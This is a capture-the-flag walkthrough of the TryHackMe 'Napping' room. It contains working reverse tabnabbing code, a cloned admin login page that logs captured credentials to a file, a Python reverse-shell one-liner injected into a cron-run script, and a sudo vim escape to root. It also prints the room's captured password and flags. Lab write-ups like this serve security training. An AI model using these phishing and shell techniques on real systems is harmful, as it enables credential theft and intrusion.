# Napping
[https://tryhackme.com/room/nappingis1337](https://tryhackme.com/room/nappingis1337)

Difficulty: Medium

## Enumeration
### Port Scan:
`sudo rustscan --range 1-65535 --ulimit 5000 -a $ip -- -sC -sV`

**Open ports:**
- 22: SSH - OpenSSH 8.2p1
- 80: Web Server - Apache httpd 2.4.41

### Directory & File Bruteforce
`gobuster dir -u http://$ip -t 100 -r -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

**Found Pages:**
admin [403]
admin/login.php
index.php
welcome.php
register.php
logout.php
config.php

## Phishing & Reverse Tab Nabbing
I created a normal user on the /register.php page and then logged in.

From here I can see that I'm able to submit a link to the page, and that an admin will review it.

After submitting a test link I can see that the link is displayed to the page and uses `target="_blank"` in an anchor tag. Since it uses this attribute I know that if the browser is old enough it's susceptible to tabnabbing (The room name is napping).

I search for this on [HackTricks](https://book.hacktricks.xyz/) and find a page on [reverse tab nabbing](https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing) which provides a PoC and some useful code that I can use to attack this room.

I created an index.html file on my machine with the following contents:
```html
<!DOCTYPE html>
<html lang="en">
<body>
	<script>
		if (window.opener) {
			window.opener.location = "http://<my vpn ip>/login.php";
		}
	</script>
</body>
</html>
```

and then cloned the /admin/login.php page and a login.php file along with some modifications (commented in below snippet)

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>


# PHP Snippet to store captured credentials to 'pwn.txt' file
# Could also be done by capturing traffic with Wireshark and found using the following filter: 
# ip.src == {box_ip} && http.request.method==POST

<?php
    if (isset($_POST['username'])) {
        file_put_contents('pwn.txt', file_get_contents('php://input'));
    }
?>


<body>
    <div class="wrapper">
        <h2>Admin Login</h2>
        <p>Please fill in your credentials to login.</p>

        # Changed action from /admin/login.php to just login.php to reflect my local path structure.
        <form action="login.php" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control " value="">
                <span class="invalid-feedback"></span>
            </div>    
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control ">
                <span class="invalid-feedback"></span>
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
            </div>
            <br>
        </form>
    </div>
</body>
</html>
```

I started a PHP server on my local machine using `sudo php -S $(tun0-ip):80` and waited for the connection.

The admin clicks on my malicious link and then proceeds to login using the below credentials:
username=daniel&password=C@ughtm3napping123

## SSH
I reused the credentials from above to log into the server over SSH.

There is one other user on the machine called "adrian" who's home directory is accessible, but the user.txt flag file isn't readable.

There is however a file that is rw for the group administrators called query.py which is a group that we are a part of.

query.py
```py
from datetime import datetime
import requests

now = datetime.now()

r = requests.get('http://127.0.0.1/')
if r.status_code == 200:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Site is Up: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
else:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Check Out Site: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
```

site_status.txt is written to every minute (found by checking timestamps in the file) so I assume that this script is ran ever minute by another user.

Since this file is writable by our user however I can add a python reverse shell script to the file by adding the following snippet:

```py
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<my vpn ip>",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

After adding this I start a netcat listener on my machine using `nc -lvnp 4242` and attempt to catch the reverse shell.

This gives me access to the user adrian on the server - so I stabilize my shell.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo && fg
export TERM=xterm
```
from here I view the contents of the file user.txt

User Flag: `THM{Wh@T_1S_Tab_NAbbiN6_&_PrinCIPl3_of_L3A$t_PriViL36E}`

## Privilege Escalation
`sudo -l` on the Adrian user show that I can use vim as root without providing a password so I use [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo) to find an exploit and I run the following command: `sudo vim -c ':!/bin/sh'` which escalates my to the root user.

I view the contents of the /root/root.txt file and find the final flag.

Root Flag: `THM{Adm1n$_jU$t_c@n'T_stAy_Aw@k3_T$k_tsk_tSK}`